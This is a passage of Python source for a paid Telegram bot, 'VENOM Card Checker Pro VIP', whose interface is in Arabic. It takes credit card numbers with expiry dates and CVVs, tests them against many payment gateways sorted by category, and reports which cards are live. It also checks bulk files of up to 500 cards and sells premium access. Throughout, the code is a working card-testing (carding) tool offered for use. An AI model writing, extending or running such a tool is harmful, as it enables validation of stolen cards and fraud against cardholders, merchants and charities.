            'shopping': '🛍️ التسوق',
            'app': '📱 التطبيقات',
            'payment': '💳 الدفع',
            'travel': '✈️ السفر',
            'all': '🌐 الكل'
        }
        
        await update.message.reply_text(
            f"📝 **استخدام فحص {category_names.get(category, category)}:**\n\n"
            f"`/{category} 6011208873681764|07|2027|805`\n\n"
            f"💡 **مثال:** `/{category} 4111111111111111|12|2025|123`\n\n"
            f"{'⭐ **صلاحيات المطور مفعلة**' if is_developer else '💎 **بريميوم مفعل**' if is_premium else ''}",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    card_info = ' '.join(context.args)
    
    # رسالة الانتظار
    wait_msg = await update.message.reply_text("🔄 **جاري فحص البطاقة...**")
    
    # التحقق من الصيغة
    is_valid, card_data = CardTools.validate_card(card_info)
    
    if not is_valid:
        await wait_msg.edit_text(card_data["error"])
        return
    
    # عرض معلومات البطاقة
    category_display = {
        'donation': '🎁 بوابات التبرعات',
        'entertainment': '📺 بوابات الترفيه',
        'shopping': '🛍️ بوابات التسوق',
        'app': '📱 بوابات التطبيقات',
        'payment': '💳 بوابات الدفع',
        'travel': '✈️ بوابات السفر',
        'all': '🌐 جميع البوابات'
    }
    
    card_text = f"""💳 **معلومات البطاقة:** {'⭐' if is_developer else '💎' if is_premium else ''}

📊 **النوع:** {card_data['type']}
🔢 **الرقم:** `{card_data['bin']}******{card_data['last4']}`
📅 **الصلاحية:** {card_data['month']}/{card_data['year']}
🔐 **CVV:** `{card_data['cvv']}`
👤 **المستخدم:** {update.effective_user.first_name}

{category_display.get(category, '🌐 جاري الفحص...')}
{'⭐ **وضع المطور مفعل**' if is_developer else '💎 **وضع بريميوم مفعل**' if is_premium else ''}"""
    
    await wait_msg.edit_text(card_text)
    
    # اختيار البوابات حسب التصنيف
    if category == 'all':
        # للمطور: جميع البوابات، للبريميوم: 50 بوابة، للمجاني: 15 بوابة
        if is_developer:
            gateways = list(GATEWAYS.keys())[:50]
        elif is_premium:
            gateways = list(GATEWAYS.keys())[:30]
        else:
            gateways = list(GATEWAYS.keys())[:15]
    else:
        gateways = [
            key for key, data in GATEWAYS.items() 
            if data.get('category') == category
        ]
        # تحديد العدد حسب نوع المستخدم
        if is_developer:
            gateways = gateways[:50]
        elif is_premium:
            gateways = gateways[:30]
        else:
            gateways = gateways[:10]
    
    if not gateways:
        await wait_msg.edit_text(f"❌ لا توجد بوابات في تصنيف {category}")
        return
    
    # فحص البطاقة
    try:
        results = await gateway_manager.check_multiple_gateways(card_data, gateways, user_id)
        
        # تحضير النتائج
        live_count = sum(1 for r in results if r['success'])
        total_count = len(results)
        
        # النتيجة النهائية
        result_text = f"""📊 **نتيجة الفحص:** {'⭐' if is_developer else '💎' if is_premium else ''}

✅ **النشطة:** {live_count}/{total_count}
❌ **المرفوضة:** {total_count - live_count}/{total_count}
📈 **النسبة:** {(live_count/total_count*100 if total_count > 0 else 0):.1f}%

🌐 **تفاصيل البوابات:**\n"""
        
        for result in results:
            emoji = "🟢" if result['success'] else "🔴"
            result_text += f"\n{emoji} **{result['gateway']}:** {result['status']}"
            result_text += f"\n   ⏱ {result['response_time']} | 📋 {result['message']}"
        
        # البطاقات الناجحة
        successful_gateways = [r['gateway'] for r in results if r['success']]
        if successful_gateways:
            result_text += f"\n\n🎯 **البوابات الناجحة:** {', '.join(successful_gateways[:5])}"
            if len(successful_gateways) > 5:
                result_text += f" و {len(successful_gateways)-5} أخرى"
        
        # إحصائيات المستخدم
        user_data = db.get_user_data(user_id)
        result_text += f"""

👤 **إحصائياتك:**
• 📊 اليوم: {user_data['checks_today']}/{'500' if is_developer else '50' if is_premium else '10'}
• ✅ الناجحة: {user_data['successful']}
• ❌ الفاشلة: {user_data['failed']}
• 🎯 النسبة: {(user_data['successful']/(user_data['successful']+user_data['failed'])*100 if (user_data['successful']+user_data['failed']) > 0 else 0):.1f}%

🕒 **الوقت:** {datetime.now().strftime('%H:%M:%S')}
👑 **المطور:** {OWNER_USERNAME}"""
        
        # أزرار
        keyboard = []
        if category != 'all':
            keyboard.append([InlineKeyboardButton(f"🔍 فحص {category_display.get(category, 'أخرى')}", switch_inline_query_current_chat=f"/{category} ")])
        
        keyboard.append([InlineKeyboardButton("📊 إحصائياتي", callback_data="user_stats")])
        
        if not is_developer and not is_premium:
            keyboard.append([InlineKeyboardButton("💎 ترقية للبريميوم", callback_data="upgrade_premium")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await wait_msg.edit_text(result_text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        
    except Exception as e:
        logger.error(f"Check error: {e}")
        await wait_msg.edit_text(f"❌ **خطأ في الفحص:**\n{str(e)[:100]}")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إحصائيات المستخدم"""
    user_id = str(update.effective_user.id)
    user_data = db.get_user_data(user_id)
    is_developer = user_id == OWNER_ID
    is_premium = user_id in db.premium_users
    
    # حساب نسبة النجاح
    total_checks = user_data['successful'] + user_data['failed']
    success_rate = (user_data['successful'] / total_checks * 100) if total_checks > 0 else 0
    
    # إحصائيات البوابات
    gateway_stats_text = ""
    if db.gateway_stats:
        top_gateways = sorted(
            db.gateway_stats.items(),
            key=lambda x: x[1]['success'],
            reverse=True
        )[:5]
        
        gateway_stats_text = "\n🏆 **أفضل البوابات:**\n"
        for gateway, stats in top_gateways:
            gateway_rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
            gateway_stats_text += f"• {gateway}: {gateway_rate:.1f}% ({stats['success']}/{stats['total']})\n"
    
    text = f"""📊 **إحصائياتك:** {'⭐' if is_developer else '💎' if is_premium else ''}

👤 **المستخدم:** {update.effective_user.first_name}
🆔 **المعرف:** `{user_id}`
{'⭐ **الحالة:** **المطور الرسمي**' if is_developer else '💎 **الحالة:** **حساب بريميوم**' if is_premium else '🔵 **الحالة:** مجاني'}

📈 **الإحصائيات:**
• ✅ **فحوصات ناجحة:** {user_data['successful']}
• ❌ **فحوصات فاشلة:** {user_data['failed']}
• 📊 **إجمالي الفحوصات:** {total_checks}
• 🎯 **نسبة النجاح:** {success_rate:.1f}%

📅 **اليوم:**
• 🔄 **فحوصات اليوم:** {user_data['checks_today']}/{'500' if is_developer else '50' if is_premium else '10'}
• ⏰ **آخر فحص:** {user_data['last_check'][:19] if user_data['last_check'] else 'لا يوجد'}

{gateway_stats_text}
👑 **المطور:** {OWNER_USERNAME}"""
    
    keyboard = [
        [InlineKeyboardButton("🔄 فحص جديد", callback_data="new_check")],
        [InlineKeyboardButton("📊 إحصائيات تفصيلية", callback_data="detailed_stats")]
    ]
    
    if not is_developer and not is_premium:
        keyboard.append([InlineKeyboardButton("💎 ترقية", callback_data="upgrade_premium")])
    
    keyboard.append([InlineKeyboardButton("📞 دعم", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """تعليمات استخدام البوت"""
    text = f"""🆘 **مساعدة واستخدام البوت:**

🤖 **VENOM CARD CHECKER PRO VIP**
👑 **المطور:** {OWNER_NAME} ({OWNER_USERNAME})

📋 **🎮 أوامر الفحص الرئيسية:**

🎁 **التبرعات:** `/donate [بطاقة]`
📺 **الترفيه:** `/entertainment [بطاقة]`
🛍️ **التسوق:** `/shopping [بطاقة]`
📱 **التطبيقات:** `/apps [بطاقة]`
💳 **الدفع:** `/payment [بطاقة]`
✈️ **السفر:** `/travel [بطاقة]`
🌐 **الكل:** `/check_all [بطاقة]`

💡 **مثال:**
`/donate 4111111111111111|12|2025|123`

📋 **🎯 أوامر عامة:**
• `/start` - بدء البوت
• `/id` - عرض معلوماتك
• `/stats` - إحصائياتك
• `/plan` - خطط الأسعار
• `/owner` - معلومات المطور

⚡ **المميزات:**
• ✅ {len(GATEWAYS)}+ بوابة دفع وسفر وتبرعات
• ✅ فحص حقيقي على بوابات أصلية
• ✅ نتائج مفصلة مع زمن الاستجابة
• ✅ نظام بروكسي متقدم
• ✅ دعم 24/7

⚠️ **ملاحظات مهمة:**
1. البطاقة يجب أن تكون على التنسيق الصحيح
2. يمكن للمستخدم المجاني 10 فحوصات يومياً
3. البريميوم يحصل على 50 فحص يومياً
4. النتائج تعتمد على استجابة البوابات الأصلية

📞 **الدعم:** {OWNER_USERNAME}
🕒 **وقت العمل:** 24/7"""
    
    keyboard = [
        [
            InlineKeyboardButton("📖 أمثلة فحص", callback_data="check_examples"),
            InlineKeyboardButton("💎 ترقية", callback_data="upgrade_premium")
        ],
        [InlineKeyboardButton("📞 تواصل مع المطور", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

# ========== معالجات Callback ==========

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة ضغطات الأزرار"""
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    is_developer = user_id == OWNER_ID
    is_premium = user_id in db.premium_users
    
    if query.data == "user_stats":
        # عرض إحصائيات المستخدم
        user_data = db.get_user_data(user_id)
        total_checks = user_data['successful'] + user_data['failed']
        success_rate = (user_data['successful'] / total_checks * 100) if total_checks > 0 else 0
        
        stats_text = f"""📊 **إحصائياتك السريعة:** {'⭐' if is_developer else '💎' if is_premium else ''}

✅ **ناجحة:** {user_data['successful']}
❌ **فاشلة:** {user_data['failed']}
🎯 **نسبة النجاح:** {success_rate:.1f}%
🔄 **فحوصات اليوم:** {user_data['checks_today']}/{'500' if is_developer else '50' if is_premium else '10'}
📅 **إجمالي الفحوصات:** {total_checks}"""
        
        await query.edit_message_text(stats_text, parse_mode=ParseMode.MARKDOWN)
        
    elif query.data == "upgrade_premium":
        # عرض خيارات الترقية
        upgrade_text = f"""💎 **ترقية إلى بريميوم:** {'⭐' if is_developer else ''}

{'⭐ **أنت المطور - حسابك مفعل بصلاحيات كاملة**' if is_developer else '💎 **حسابك مفعل بريميوم بالفعل**' if is_premium else ''}

📋 **المميزات:**
• 50 فحص يومياً (بدلاً من 10)
• 20 بوابات لكل فحص (بدلاً من 5)
• إحصائيات متقدمة
• أولوية في الدعم
• فحص ملفات TXT

💰 **الأسعار:**
• أسبوع: 10$
• شهر: 25$
• 3 أشهر: 60$

👑 **VIP (غير محدود):**
• فحص غير محدود
• جميع البوابات ({len(GATEWAYS)}+)
• دعم فوري 24/7
• مزايا خاصة

📞 **للشراء راسل:** {OWNER_USERNAME}
🔑 **معرفك:** `{user_id}`"""
        
        keyboard = []
        
        if not is_developer and not is_premium:
            keyboard.append([InlineKeyboardButton("💵 شراء بريميوم أسبوع", callback_data="buy_premium_week")])
            keyboard.append([InlineKeyboardButton("💵 شراء بريميوم شهر", callback_data="buy_premium_month")])
            keyboard.append([InlineKeyboardButton("👑 شراء VIP", callback_data="buy_vip")])
        
        keyboard.append([InlineKeyboardButton("📞 تواصل للشراء", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")])
        
        if is_developer:
            keyboard.append([InlineKeyboardButton("⚙️ لوحة المطور", callback_data="developer_panel")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(upgrade_text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        
    elif query.data == "new_check":
        # عرض خيارات الفحص الجديد
        categories_text = f"""🔍 **اختر نوع الفحص:** {'⭐' if is_developer else '💎' if is_premium else ''}

🎁 **التبرعات:** مواقع التبرعات الخيرية
📺 **الترفيه:** Netflix, Spotify, YouTube
🛍️ **التسوق:** Amazon, eBay, متاجر
📱 **التطبيقات:** Telegram, WhatsApp, Google
💳 **الدفع:** Stripe, PayPal, بوابات دفع
✈️ **السفر:** خطوط طيران، فنادق، حجز
🌐 **الكل:** جميع البوابات ({len(GATEWAYS)}+)

💡 **مثال:** `/donate 6011208873681764|07|2027|805`"""
        
        keyboard = [
            [
                InlineKeyboardButton("🎁 تبرعات", switch_inline_query_current_chat="/donate "),
                InlineKeyboardButton("📺 ترفيه", switch_inline_query_current_chat="/entertainment ")
            ],
            [
                InlineKeyboardButton("🛍️ تسوق", switch_inline_query_current_chat="/shopping "),
                InlineKeyboardButton("📱 تطبيقات", switch_inline_query_current_chat="/apps ")
            ],
            [
                InlineKeyboardButton("💳 دفع", switch_inline_query_current_chat="/payment "),
                InlineKeyboardButton("✈️ سفر", switch_inline_query_current_chat="/travel ")
            ],
            [
                InlineKeyboardButton("🌐 الكل", switch_inline_query_current_chat="/check_all "),
                InlineKeyboardButton("📖 أمثلة", callback_data="check_examples")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(categories_text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        
    elif query.data == "check_examples":
        # عرض أمثلة فحص
        examples_text = """📖 **أمثلة لفحص البطاقات:**

🎁 **فحص تبرعات:**
`/donate 4111111111111111|12|2025|123`
`/donate 6011208873681764|07|2027|805`

📺 **فحص ترفيه:**
`/entertainment 5555555555554444|09|2026|456`
`/entertainment 378282246310005|03|2024|1234`

🛍️ **فحص تسوق:**
`/shopping 4222222222222|11|2025|789`
`/shopping 5105105105105100|05|2027|321`

📱 **فحص تطبيقات:**
`/apps 4012888888881881|08|2026|654`
`/apps 3566002020360505|12|2025|987`

💳 **فحص دفع:**
`/payment 30569309025904|06|2024|123`
`/payment 371449635398431|10|2026|456`

✈️ **فحص سفر:**
`/travel 4111111111111111|12|2025|123`

🌐 **فحص شامل:**
`/check_all 4111111111111111|12|2025|123`

⚠️ **ملاحظة:** الأرقام هي للتوضيح فقط"""
        
        await query.edit_message_text(examples_text, parse_mode=ParseMode.MARKDOWN)
        
    elif query.data.startswith("category_"):
        # فحص حسب التصنيف من الزر
        category = query.data.replace("category_", "")
        category_names = {
            'donate': '🎁 التبرعات',
            'entertainment': '📺 الترفيه',
            'shopping': '🛍️ التسوق',
            'apps': '📱 التطبيقات',
            'payment': '💳 الدفع',
            'travel': '✈️ السفر',
            'all': '🌐 الكل'
        }
        
        category_text = f"""🔍 **فحص {category_names.get(category, category)}:**

📝 **الصيغة:** `/{category} [رقم البطاقة|الشهر|السنة|CVV]`

💡 **مثال:** `/{category} 4111111111111111|12|2025|123`

⚠️ **ملاحظة:** البطاقة يجب أن تكون صالحة وليس منتهية الصلاحية"""
        
        await query.edit_message_text(category_text, parse_mode=ParseMode.MARKDOWN)
        
    elif query.data.startswith("buy_"):
        # عملية الشراء
        plan = query.data.replace("buy_", "")
        plan_names = {
            'premium_week': '💎 بريميوم أسبوع',
            'premium_month': '💎 بريميوم شهر',
            'vip': '👑 VIP'
        }
        prices = {
            'premium_week': '10$',
            'premium_month': '25$',
            'vip': '50$'
        }
        
        buy_text = f"""🛒 **طلب شراء {plan_names.get(plan, plan)}:**

💰 **السعر:** {prices.get(plan, 'N/A')}
👤 **المشتري:** {query.from_user.full_name}
🆔 **المعرف:** `{user_id}`

📞 **لإكمال عملية الشراء:**
1. راسل {OWNER_USERNAME}
2. أرسل له هذا الرسالة
3. انتظر التعليمات

⚡ **سيتم تفعيل الخطة خلال 5 دقائق من الدفع**

📋 **تفاصيل الطلب:**
• النوع: {plan_names.get(plan, plan)}
• السعر: {prices.get(plan, 'N/A')}
• الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M')}
• الحالة: ⏳ في انتظار الدفع"""
        
        await query.edit_message_text(buy_text, parse_mode=ParseMode.MARKDOWN)
    
    elif query.data == "system_stats":
        # إحصائيات النظام (للمطور)
        total_users = len(db.user_stats)
        total_checks = sum(user['total_checks'] for user in db.user_stats.values())
        total_premium = len(db.premium_users)
        
        system_text = f"""📊 **إحصائيات النظام:** ⭐

👥 **المستخدمين:** {total_users}
🔄 **الفحوصات:** {total_checks}
💎 **بريميوم:** {total_premium}
🌐 **البوابات:** {len(GATEWAYS)}

📈 **إحصائيات اليوم:**
• الفحوصات: {sum(1 for user in db.user_stats.values() if user.get('last_check_date') == datetime.now().strftime('%Y-%m-%d'))}
• المستخدمين النشطين: {sum(1 for user in db.user_stats.values() if user.get('checks_today', 0) > 0)}

🏆 **أفضل المستخدمين:**
{get_top_users()}"""
        
        await query.edit_message_text(system_text, parse_mode=ParseMode.MARKDOWN)
    
    elif query.data == "developer_panel":
        # لوحة المطور
        dev_text = f"""⚙️ **لوحة المطور:** ⭐

👑 **مرحباً {OWNER_NAME}!**

📋 **الإحصائيات:**
• المستخدمين: {len(db.user_stats)}
• الفحوصات: {sum(user['total_checks'] for user in db.user_stats.values())}
• البريميوم: {len(db.premium_users)}

🔧 **الأوامر المتاحة:**
• `/activate [id] [plan]` - تفعيل حساب
• `/deactivate [id]` - إلغاء تفعيل
• `/broadcast [رسالة]` - بث رسالة
• `/stats_all` - إحصائيات كاملة

📊 **إحصائياتك:**
• فحوصات اليوم: {db.get_user_data(user_id)['checks_today']}
• الناجحة: {db.get_user_data(user_id)['successful']}
• الفاشلة: {db.get_user_data(user_id)['failed']}"""
        
        keyboard = [
            [InlineKeyboardButton("📊 إحصائيات النظام", callback_data="system_stats")],
            [InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="manage_users")],
            [InlineKeyboardButton("📈 إحصائيات البوابات", callback_data="gateways_stats")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(dev_text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

def get_top_users():
    """الحصول على أفضل المستخدمين"""
    if not db.user_stats:
        return "لا يوجد بيانات"
    
    top_users = sorted(
        db.user_stats.items(),
        key=lambda x: x[1]['total_checks'],
        reverse=True
    )[:5]
    
    result = ""
    for i, (user_id, data) in enumerate(top_users, 1):
        result += f"{i}. ID: {user_id[:8]}... | فحوصات: {data['total_checks']}\n"
    
    return result

# ========== معالج الرسائل العامة ==========

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الرسائل النصية"""
    message_text = update.message.text or ""
    user_id = str(update.effective_user.id)
    is_developer = user_id == OWNER_ID
    
    # إذا كانت الرسالة تحتوي على بيانات بطاقة
    if '|' in message_text and any(char.isdigit() for char in message_text):
        # تحقق إذا كانت تبدو كبطاقة
        parts = message_text.split('|')
        if len(parts) >= 3 and len(parts[0].replace(' ', '')) >= 13:
            await update.message.reply_text(
                f"💡 **يبدو أنك أرسلت بيانات بطاقة!** {'⭐' if is_developer else ''}\n\n"
                "استخدم أحد الأوامر التالية:\n"
                "• `/donate [البطاقة]` - للتبرعات\n"
                "• `/entertainment [البطاقة]` - للترفيه\n"
                "• `/shopping [البطاقة]` - للتسوق\n"
                "• `/apps [البطاقة]` - للتطبيقات\n"
                "• `/payment [البطاقة]` - للدفع\n"
                "• `/travel [البطاقة]` - للسفر\n"
                "• `/check_all [البطاقة]` - للفحص الكامل\n\n"
                "💡 **مثال:** `/donate 4111111111111111|12|2025|123`",
                parse_mode=ParseMode.MARKDOWN
            )
            return
    
    # إذا كانت رسالة عادية
    await update.message.reply_text(
        f"👋 **مرحباً {update.effective_user.first_name}!** {'⭐' if is_developer else ''}\n\n"
        f"استخدم /start لرؤية الأوامر\n"
        f"أو /help للمساعدة\n\n"
        f"👑 **المطور:** {OWNER_USERNAME}",
        parse_mode=ParseMode.MARKDOWN
    )

# ========== معالج الأخطاء ==========

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الأخطاء"""
    logger.error(f"Error: {context.error}")
    
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text(
                f"⚠️ **حدث خطأ في النظام**\n\n"
                f"الخطأ: `{str(context.error)[:100]}`\n\n"
                f"📞 **رجاءً راسل {OWNER_USERNAME} للإبلاغ عن المشكلة**",
                parse_mode=ParseMode.MARKDOWN
            )
        except:
            pass

# ========== وظائف إضافية ==========

async def check_txt_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص ملف txt يحتوي على بطاقات"""
    user_id = str(update.effective_user.id)
    is_premium = user_id in db.premium_users
    is_developer = user_id == OWNER_ID
    
    # التحقق إذا كان المستخدم بريميوم أو مطور
    if not is_premium and not is_developer:
        await update.message.reply_text(
            "❌ **هذه الميزة للمستخدمين المميزين فقط!**\n\n"
            "💎 /plan لترقية حسابك إلى بريميوم\n"
            "👑 للمزيد: {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # التحقق من وجود ملف
    if not update.message.document:
        await update.message.reply_text(
            f"📁 **أرسل ملف TXT يحتوي على البطاقات** {'⭐' if is_developer else '💎' if is_premium else ''}\n\n"
            "📝 **التنسيق المطلوب:**\n"
            "`6011208873681764|07|2027|805`\n"
            "`4111111111111111|12|2025|123`\n"
            "... وهكذا\n\n"
            f"⚠️ **الحد الأقصى:** {'500' if is_developer else '100'} بطاقة في الملف",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # تحميل الملف
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    
    try:
        # تحليل البطاقات
        cards_text = file_content.decode('utf-8')
        cards = [line.strip() for line in cards_text.split('\n') if '|' in line]
        
        if not cards:
            await update.message.reply_text("❌ **لم يتم العثور على بطاقات صالحة في الملف**")
            return
        
        # تحديد عدد البطاقات
        max_cards = min(len(cards), 500 if is_developer else 100)  # المطور 500، بريميوم 100
        cards = cards[:max_cards]
        
        # بدء الفحص
        wait_msg = await update.message.reply_text(f"🔄 **جاري فحص {len(cards)} بطاقة...**")
        
        results = []
        successful_cards = []
        
        for i, card_info in enumerate(cards, 1):
            # تحديث حالة التقدم كل 10 بطاقات
            if i % 10 == 0:
                progress = f"📊 **التقدم:** {i}/{len(cards)} بطاقة\n✅ **الناجحة:** {len(successful_cards)}"
                await wait_msg.edit_text(f"🔄 **جاري فحص {len(cards)} بطاقة...**\n\n{progress}")
            
            # فحص البطاقة
            is_valid, card_data = CardTools.validate_card(card_info)
            
            if is_valid:
                # فحص على بوابة واحدة فقط لتسريع العملية
                gateways = ['stripe']  # بوابة واحدة فقط للفحص السريع
                try:
                    gateway_results = await gateway_manager.check_multiple_gateways(card_data, gateways, user_id)
                    if gateway_results and gateway_results[0]['success']:
                        successful_cards.append({
                            'card': card_info,
                            'type': card_data['type'],
                            'gateway': gateway_results[0]['gateway']
                        })
                except:
                    pass
            
            # تأخير بين البطاقات
            await asyncio.sleep(0.5)
        
        # عرض النتائج النهائية
        result_text = f"""📊 **نتائج فحص الملف:** {'⭐' if is_developer else '💎' if is_premium else ''}

📁 **عدد البطاقات:** {len(cards)}
✅ **الناجحة:** {len(successful_cards)}
❌ **الفاشلة:** {len(cards) - len(successful_cards)}
🎯 **نسبة النجاح:** {(len(successful_cards)/len(cards)*100 if cards else 0):.1f}%

📋 **البطاقات الناجحة:**"""
        
        for card_info in successful_cards[:10]:  # عرض أول 10 فقط
            card_parts = card_info['card'].split('|')
            if len(card_parts) >= 4:
                card_num = card_parts[0]
                masked = card_num[:6] + "*" * (len(card_num)-10) + card_num[-4:]
                result_text += f"\n• `{masked}|{card_parts[1]}|{card_parts[2]}|{card_parts[3]}` ({card_info['type']})"
        
        if len(successful_cards) > 10:
            result_text += f"\n... و {len(successful_cards)-10} بطاقة أخرى"
        
        result_text += f"\n\n👤 **المستخدم:** {update.effective_user.first_name}"
        result_text += f"\n🕒 **الوقت:** {datetime.now().strftime('%H:%M:%S')}"
        result_text += f"\n👑 **المطور:** {OWNER_USERNAME}"
        
        await wait_msg.edit_text(result_text, parse_mode=ParseMode.MARKDOWN)
        
    except Exception as e:
        logger.error(f"File check error: {e}")
        await update.message.reply_text(f"❌ **خطأ في معالجة الملف:**\n{str(e)[:100]}")

# ========== دالة التفعيل ==========

async def activate_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """تفعيل حساب بريميوم (للمطور فقط)"""
    user_id = str(update.effective_user.id)
    
    # التحقق إذا كان المطور
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ **هذا الأمر للمطور فقط!**")
        return
    
    # التحقق من وجود معرف المستخدم
    if not context.args:
        await update.message.reply_text("📝 **استخدام:** `/activate [معرف المستخدم] [خطة]`\nخطط: premium, vip")
        return
    
    target_user = context.args[0]
    plan = context.args[1] if len(context.args) > 1 else 'premium'
    
    if plan == 'vip':
        db.premium_users.add(target_user)
        message = f"👑 **تم ترقية المستخدم {target_user} إلى VIP!**"
    else:
        db.premium_users.add(target_user)
        message = f"💎 **تم تفعيل بريميوم للمستخدم {target_user}!**"
    
    await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)

async def deactivate_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إلغاء تفعيل حساب (للمطور فقط)"""
    user_id = str(update.effective_user.id)
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ **هذا الأمر للمطور فقط!**")
        return
    
    if not context.args:
        await update.message.reply_text("📝 **استخدام:** `/deactivate [معرف المستخدم]`")
        return
    
    target_user = context.args[0]
    
    if target_user in db.premium_users:
        db.premium_users.remove(target_user)
        message = f"❌ **تم إلغاء تفعيل المستخدم {target_user}!**"
    else:
        message = f"⚠️ **المستخدم {target_user} ليس مفعلاً!**"
    
    await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """بث رسالة لجميع المستخدمين (للمطور فقط)"""
    user_id = str(update.effective_user.id)
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ **هذا الأمر للمطور فقط!**")
        return
    
    if not context.args:
        await update.message.reply_text("📝 **استخدام:** `/broadcast [الرسالة]`")
        return
    
    message = ' '.join(context.args)
    users_count = len(db.user_stats)
    
    broadcast_msg = await update.message.reply_text(f"📢 **جاري البث لـ {users_count} مستخدم...**")
    
    sent = 0
    failed = 0
    
    for user_id in db.user_stats.keys():
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📢 **إعلان من المطور:**\n\n{message}\n\n👑 {OWNER_USERNAME}"
            )
            sent += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    
    await broadcast_msg.edit_text(
        f"✅ **تم البث بنجاح!**\n\n"
        f"✅ **المرسلة:** {sent}\n"
        f"❌ **الفاشلة:** {failed}\n"
        f"📊 **الإجمالي:** {users_count}"
    )

async def stats_all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إحصائيات كاملة للنظام (للمطور فقط)"""
    user_id = str(update.effective_user.id)
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ **هذا الأمر للمطور فقط!**")
        return
    
    total_users = len(db.user_stats)
    total_checks = sum(user['total_checks'] for user in db.user_stats.values())
    total_premium = len(db.premium_users)
    
    today = datetime.now().strftime('%Y-%m-%d')
    today_checks = sum(1 for user in db.user_stats.values() if user.get('last_check_date') == today)
    
    # إحصائيات البوابات
    gateways_stats = ""
    if db.gateway_stats:
        sorted_gateways = sorted(
            db.gateway_stats.items(),
            key=lambda x: x[1]['total'],
            reverse=True
        )[:10]
        
        gateways_stats = "\n🏆 **أفضل 10 بوابات:**\n"
        for gateway, stats in sorted_gateways:
            success_rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
            gateways_stats += f"• {gateway}: {stats['total']} فحص | {success_rate:.1f}% نجاح\n"
    
    stats_text = f"""📊 **إحصائيات النظام الكاملة:** ⭐

👥 **المستخدمين:** {total_users}
🔄 **الفحوصات:** {total_checks}
💎 **بريميوم:** {total_premium}
📅 **فحوصات اليوم:** {today_checks}

{gateways_stats}

📈 **أفضل 5 مستخدمين:**
{get_top_users()}

⚡ **البوت يعمل بنجاح منذ:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
    
    await update.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)

# ========== إعداد التطبيق ==========

def main():
    """الدالة الرئيسية لتشغيل البوت"""
    print("=" * 60)
    print("🤖 بدء تشغيل VENOM Card Checker Pro VIP...")
    print(f"👑 المطور: {OWNER_NAME}")
    print(f"📱 اليوزر: {OWNER_USERNAME}")
    print(f"🆔 معرف المطور: {OWNER_ID}")
    print(f"🔑 توكن البوت: {TOKEN[:15]}...")
    print(f"🌐 عدد البوابات: {len(GATEWAYS)}")
    print("=" * 60)
    print("⏳ جاري التهيئة...")
    
    # إنشاء التطبيق
    application = Application.builder().token(TOKEN).build()
    
    # إضافة المعالجات الأساسية
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("owner", owner_command))
    application.add_handler(CommandHandler("plan", plan_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # أوامر الفحص
    application.add_handler(CommandHandler("donate", donate_command))
    application.add_handler(CommandHandler("entertainment", entertainment_command))
    application.add_handler(CommandHandler("shopping", shopping_command))
    application.add_handler(CommandHandler("apps", apps_command))
    application.add_handler(CommandHandler("payment", payment_command))
    application.add_handler(CommandHandler("travel", travel_command))
    application.add_handler(CommandHandler("check_all", check_all_command))
    
    # أوامر المطور
    application.add_handler(CommandHandler("activate", activate_premium))
    application.add_handler(CommandHandler("deactivate", deactivate_premium))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("stats_all", stats_all_command))
    
    # أوامر خاصة
    application.add_handler(CommandHandler("txt", check_txt_file))
    
    # معالجات Callback
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # معالج الرسائل العامة
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # معالج الأخطاء
    application.add_error_handler(error_handler)
    
    # بدء البوت
